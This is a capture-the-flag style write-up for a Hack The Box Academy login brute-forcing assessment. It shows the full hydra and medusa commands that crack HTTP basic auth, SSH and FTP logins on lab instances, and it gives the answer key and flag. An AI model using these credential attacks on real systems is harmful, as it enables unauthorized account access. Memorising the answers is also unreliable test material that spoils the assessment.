# [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)

## Skills Assessment (Part 1)

The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

### Questions

#### Question #01

**Question**

What is the password for the basic auth login?

```
┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-fknfgb0jab]─[~]
└──╼ [★]$ whatweb http://83.136.251.97:54448/

http://83.136.251.97:54448/ [401 Unauthorized] Country[FINLAND][FI], HTTPServer[nginx/1.27.1], IP[83.136.251.97], Title[401 Authorization Required], WWW-Authenticate[Restricted][Basic], nginx[1.27.1]
```

```
┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-fknfgb0jab]─[~]
└──╼ [★]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.251.97 http-get / -s 54448

[SNIP]

[54448][http-get] host: 83.136.251.97   login: admin   password: Admin123

[SNIP]
```

**Answer**

```
Admin123
```

#### Question #02

**Question**

After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

![Firefox - Basic Authentication Login](./assets/screenshots/login_brute_forcing_firefox_basic_authentication_login.png)

**Answer**

```
satwossh
```

## Skills Assessment (Part 2)

This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

### Questions

#### Question #01

**Question**

What is the username of the ftp user you find via brute-forcing?

```
┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-fknfgb0jab]─[~]
└──╼ [★]$ nc 94.237.58.172 48094

SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10

┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-fknfgb0jab]─[~]
└──╼ [★]$ hydra -l satwossh -P 2023-200_most_used_passwords.txt 94.237.58.172 ssh -s 48094

[SNIP]

[48094][ssh] host: 94.237.58.172   login: satwossh   password: password1

[SNIP]
```

```
┌─[eu-academy-1]─[10.10.15.8]─[htb-ac-1461567@htb-fknfgb0jab]─[~]
└──╼ [★]$ ssh satwossh@94.237.58.172 -p 48094

[SNIP]

satwossh@94.237.58.172's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)
satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$
```

```
satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ ls -la

total 36
drwxr-xr-x 1 satwossh satwossh 4096 May 27 09:22 .
drwxr-xr-x 1 root     root     4096 Sep 12  2024 ..
drwx------ 2 satwossh satwossh 4096 May 27 09:22 .cache
-rw------- 1 satwossh satwossh  572 Sep 10  2024 IncidentReport.txt
-rw------- 1 satwossh satwossh 1605 Sep 12  2024 passwords.txt
drwxr-xr-x 1 satwossh satwossh 4096 Sep 12  2024 username-anarchy

satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ cat IncidentReport.txt 

System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.

Security Operations Team

satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ ./username-anarchy/username-anarchy Thomas Smith > thomas_smith_usernames.txt

satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ head -n 3 passwords.txt 

123456
123456789
picture1
```

```
satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ netstat -tunlp | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -  

satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ medusa -h 127.0.0.1 -U thomas_smith_usernames.txt -P passwords.txt -M ftp -f -t 5

[SNIP]

ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]

[SNIP]
```

**Answer**

```
thomas
```

#### Question #02

**Question**

What is the flag contained within `flag.txt`.

```
satwossh@ng-1461567-loginbfsatwo-sgr1t-8557fbf76f-h8j4g:~$ ftp ftp://thomas:'chocolate!'@localhost

Connected to localhost.
220 (vsFTPd 3.0.5)

[SNIP]

ftp> ls
-rw-------    1 1001     1001           28 Sep 10  2024 flag.txt

ftp> get flag.txt
local: flag.txt remote: flag.txt
226 Transfer complete.

ftp> !cat flag.txt
HTB{brut3f0rc1ng_succ3ssful}
```

**Answer**

```
HTB{brut3f0rc1ng_succ3ssful}
```

---
---